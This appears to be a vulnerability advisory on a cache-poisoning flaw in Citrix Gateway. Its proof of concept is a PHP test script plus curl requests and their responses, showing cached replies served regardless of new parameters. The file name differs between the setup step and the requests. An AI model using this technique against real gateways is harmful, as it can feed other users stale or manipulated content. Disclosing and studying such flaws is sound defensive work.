~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

"Citrix Gateway is a customer-managed solution that can be deployed on
Platform.  Citrix Gateway provides users with secure access and single
sign-on to all the virtual, SaaS and web applications they need to be
productive." (see [1])

The solution contains a caching system, which stores dynamic content
for a static period of time.  During the caching time, even requests
with individual parameters are answered with the cached value.  This
can be abused for cache poisoning.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

If a client is asking for an URL with parameter "value=A", the
parameter will be processed and the response will be cached.  If
another client is requesting the same URL but with a different
parameter "value=B", the request will be answered with the initial
response ("value=A") during the caching time (for 112 seconds).

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

Provide on a Citrix Gateway system ($NSGATEWAYHOST) the following PHP
script at /var/netscaler/logon/increment.php.

<?php
print(++$_POST[value]);
print("\n");
?>

The first response will be processed correctly, meaning that the
provided value in the HTTP response will be incremented by one.

$ curl --include --url https://$NSGATEWAYHOST/logon/incremental.php --data "value=41" 
HTTP/1.1 200 OK
Age: 1         
Date: Fri, 31 Jan 2020 12:13:11 GMT
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Cache-Control: no-store, must-revalidate
Connection: Keep-Alive
Via: NS-CACHE-10.0: 121
ETag: "KXGGENKFDKPU"
Server: Apache
X-Frame-Options: SAMEORIGIN
Pragma: no-cache
Content-Length: 3
Content-Type: text/html; charset=UTF-8

42


A later request will be answered with the same value, even with
another browser from another source IP address:

$ curl --include --url https://$NSGATEWAYHOST/logon/incremental.php --data "value=77" --user-agent "Mozilla"
HTTP/1.1 200 OK
Age: 71        
Date: Fri, 31 Jan 2020 12:13:11 GMT
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Cache-Control: no-store,must-revalidate
Connection: Keep-Alive
Via: NS-CACHE-10.0: 121
ETag: "KXGGENKFDKPU"
Server: Apache
X-Frame-Options: SAMEORIGIN
Pragma: no-cache
Content-Length: 3
Content-Type: text/html; charset=UTF-8

42


If the age of the response reaches 112, the cache will be cleared and
then the correct value will be used.
